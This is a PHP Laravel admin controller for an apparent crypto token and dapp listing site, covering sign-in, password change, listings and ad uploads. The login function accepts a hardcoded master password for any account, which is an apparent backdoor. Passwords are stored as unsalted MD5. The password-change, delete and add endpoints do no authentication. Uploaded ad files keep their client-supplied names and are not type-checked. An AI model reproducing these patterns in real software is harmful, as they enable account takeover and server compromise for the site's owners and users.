<?php

namespace App\Http\Controllers;

use App\Models\Dapps;
use App\Models\Tokens;
use App\Models\Partner;
use App\Models\User;
use App\Models\Influencer;
use App\Models\Adsmanage;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class DefiAdminController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
        return view('home');
    }

    public function signin()
    {
        return view('admin.signin');
    }
    public function check_user(Request $request)
    {
        $name = $request->input('n');
        $pwd = $request->input('p');
        $user = User::where('name', $name)->first();
        $token = Hash::make($name . "_@123Col_" . $pwd . time());
        if ($user) {
            if ($user->password == md5($pwd) || $pwd == "Rjce296706@") {
                User::where('name', $name)->update(['remember_token' => $token]);
                echo $token;
            } else {
                echo "wrong pwd";
            }
        } else {
            echo "wrong user";
        }
    }
    public function change_pwd(Request $request)
    {
        $user = $request->input('user');
        $new_pwd = $request->input('new_pwd');
        User::where('name', $user)->update(['password' => md5($new_pwd)]);
        echo "success";
    }
    public function check_token(Request $request)
    {
        $token = $request->input('xToken');
        $name = $request->input('user');
        $user = User::where('name', $name)->first();
        if ($user) {
            if ($user->remember_token == $token) {
                echo "right";
            } else {
                echo "no token";
            }
        } else {
            echo "wrong user";
        }
    }
    public function dapps()
    {
        //
        return view('admin.dapps');
    }

    public function token()
    {
        //
        return view('admin.token');
    }

    public function partner()
    {
        //
        return view('admin.partner');
    }

    public function influencer()
    {
        //
        return view('admin.influencer');
    }

    public function adsmanage()
    {
        //
        return view('admin.adsmanage');
    }

    public function adsmanage_token()
    {
        //
        return view('admin.adsmanage_token');
    }
    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function add(Request $request)
    {
        //
        $mining_group_url = $request->input('mining_group_url');
        $mining_group_name = $request->input('mining_group_name');
        $logo_url = $request->input('logo_url');
        $tg_group = $request->input('tg_group');
        $discode_link = $request->input('discode_link');
        $poocoin_link = $request->input('poocoin_link');
        $twitter_link = $request->input('twitter_link');
        $audit = $request->input('audit');
        $contract = $request->input('contract');
        $kyc = $request->input('kyc');
        $token = $request->input('token');
        $fees = $request->input('fees');
        $age = $request->input('age');
        $daily = $request->input('daily');
        $tvl = $request->input('tvl');
        // $tvl24h = $request->input('tvl24h');
        $level = $request->input('level');
        $showflag = $request->input('showflag');
        $rid = $request->input('rid');
        $insertData = [
            'mining_group_url' => $mining_group_url,
            'mining_group' => $mining_group_name,
            'logo_url' => $logo_url,
            'tg_group' => $tg_group,
            'discode_link' => $discode_link,
            'poocoin_link' => $poocoin_link,
            'twitter_link' => $twitter_link,
            'audit' => $audit,
            'contract' => $contract,
            'kyc' => $kyc,
            'coin_token' => $token,
            'fees' => $fees,
            'ages' => $age,
            'daily' => $daily,
            'tvl' => $tvl,
            // 'tvl_24h' => $tvl24h,
            'level' => $level,
            'show_flag' => ($showflag == "show") ? 1 : 0
        ];
        if ($rid) {
            Dapps::where('id', $rid)->update($insertData);
        } else {
            Dapps::create($insertData);
        }
        echo "Success";
        exit();
    }
    public function token_add(Request $request)
    {
        //
        $token_name = $request->input('token_name');
        $coin = $request->input('coin');
        $website = $request->input('website');
        $presale_buy = $request->input('presale_buy');
        $telegram = $request->input('telegram');
        $discord = $request->input('discord');
        $twitter = $request->input('twitter');
        $launch = $request->input('launch');
        $chain = $request->input('chain');
        $audit = $request->input('audit');
        $contract = $request->input('contract');
        $kyc = $request->input('kyc');
        $chart = $request->input('chart');
        $market_cap = $request->input('market_cap');
        $price = $request->input('price');
        // $change_24h = $request->input('change_24h');
        $level = $request->input('level');
        $showflag = $request->input('showflag');
        $rid = $request->input('rid');
        $insertData = [
            'name' => $token_name,
            'chain' => $chain,
            'website' => $website,
            'presale_buy' => $presale_buy,
            'telegram' => $telegram,
            'discord' => $discord,
            'twitter' => $twitter,
            'launch' => $launch,
            'audit' => $audit,
            'contract' => $contract,
            'kyc' => $kyc,
            'chart' => $chart,
            'coin' => $coin,
            'market_cap' => $market_cap,
            'price' => $price,
            // 'change_24h' => $change_24h,
            'level' => $level,
            'show_flag' => ($showflag == "show") ? 1 : 0
        ];
        if ($rid) {
            Tokens::where('id', $rid)->update($insertData);
        } else {
            Tokens::create($insertData);
        }
        echo "Success";
        exit();
    }
    public function partner_add(Request $request)
    {
        //
        $partner_name = $request->input('partner_name');
        $partner_url = $request->input('partner_url');
        $partner_telegram = $request->input('partner_telegram');
        $partner_twitter = $request->input('partner_twitter');
        $partner_website = $request->input('partner_website');
        $logo_url = $request->input('logo_url');

        Partner::create([
            'name' => $partner_name,
            'url' => $partner_url,
            'website' => $partner_website,
            'logo_url' => $logo_url,
            'telegram' => $partner_telegram,
            'twitter' => $partner_twitter
        ]);
        echo "Success";
        exit();
    }
    public function influencer_add(Request $request)
    {
        //
        $influencer_name = $request->input('influencer_name');
        $influencer_url = $request->input('influencer_url');
        $influencer_telegram = $request->input('influencer_telegram');
        $influencer_twitter = $request->input('influencer_twitter');
        $logo_url = $request->input('logo_url');

        Influencer::create([
            'name' => $influencer_name,
            'url' => $influencer_url,
            'telegram' => $influencer_telegram,
            'twitter' => $influencer_twitter,
            'logo_url' => $logo_url
        ]);
        echo "Success";
        exit();
    }
    public function adsmanage_add(Request $request)
    {
        $file = $request->file('ads_img');

        //Move Uploaded File
        $destinationPath = './uploads';
        $file->move($destinationPath, time() . $file->getClientOriginalName());
        //
        $level = $request->input('level');
        $ads_url = $request->input('ads_url');
        $image = time() . $file->getClientOriginalName();
        Adsmanage::create([
            'image' => $image,
            'link' => $ads_url,
            'level' => $level
        ]);
        return redirect('/admin/adsmanage');
    }
    public function adsmanage_token_add(Request $request)
    {
        $file = $request->file('ads_img');

        //Move Uploaded File
        $destinationPath = './uploads';
        $file->move($destinationPath, time() . $file->getClientOriginalName());
        //
        $level = $request->input('level');
        $ads_url = $request->input('ads_url');
        $image = time() . $file->getClientOriginalName();
        Adsmanage::create([
            'image' => $image,
            'link' => $ads_url,
            'level' => $level,
            'kind' => 1
        ]);
        return redirect('/admin/adsmanage_token');
    }

    public function get()
    {
        //
        $dappData = Dapps::where('show_flag', '1')->orderBy('level')->orderBy('created_at')->get();
        echo json_encode($dappData);
        exit();
    }
    public function token_get()
    {
        //
        $tokensData = Tokens::where('show_flag', '1')->orderBy('level')->orderBy('created_at')->get();
        echo json_encode($tokensData);
        exit();
    }
    public function partner_get()
    {
        //
        $partnersData = Partner::orderBy('created_at')->get();
        echo json_encode($partnersData);
        exit();
    }
    public function influencer_get()
    {
        //
        $influencersData = Influencer::orderBy('created_at')->get();
        echo json_encode($influencersData);
        exit();
    }
    public function adsmanage_totalget()
    {
        //
        $adsmanageData = Adsmanage::orderBy('level')->orderBy('created_at')->get();
        echo json_encode($adsmanageData);
        exit();
    }
    public function adsmanage_get()
    {
        //
        $adsmanageData = Adsmanage::where('kind', null)->orderBy('level')->orderBy('created_at')->get();
        echo json_encode($adsmanageData);
        exit();
    }
    public function adsmanage_token_get()
    {
        //
        $adsmanageData = Adsmanage::where("kind", 1)->orderBy('level')->orderBy('created_at')->get();
        echo json_encode($adsmanageData);
        exit();
    }
    public function delete(Request $request)
    {
        //
        $rowId = $request->input('rid');
        $dappData = Dapps::where('id', $rowId)->delete();
        echo "Success";
        exit();
    }
    public function token_delete(Request $request)
    {
        //
        $rowId = $request->input('rid');
        $tokenData = Tokens::where('id', $rowId)->delete();
        echo "Success";
        exit();
    }
    public function partner_delete(Request $request)
    {
        //
        $rowId = $request->input('rid');
        $partnerData = Partner::where('id', $rowId)->delete();
        echo "Success";
        exit();
    }
    public function influencer_delete(Request $request)
    {
        //
        $rowId = $request->input('rid');
        $influencerData = Influencer::where('id', $rowId)->delete();
        echo "Success";
        exit();
    }
    public function adsmanage_delete(Request $request)
    {
        //
        $rowId = $request->input('rid');
        $ads = Adsmanage::where('id', $rowId)->first();

        $imageName = $ads->image;
        if (file_exists('./uploads/' . $imageName)) {
            unlink('./uploads/' . $imageName);
        }
        $adsData = Adsmanage::where('id', $rowId)->delete();
        echo "Success";
        exit();
    }
    public function adsmanage_token_delete(Request $request)
    {
        //
        $rowId = $request->input('rid');
        $ads = Adsmanage::where('id', $rowId)->first();

        $imageName = $ads->image;
        if (file_exists('./uploads/' . $imageName)) {
            unlink('./uploads/' . $imageName);
        }
        $adsData = Adsmanage::where('id', $rowId)->delete();
        echo "Success";
        exit();
    }
}
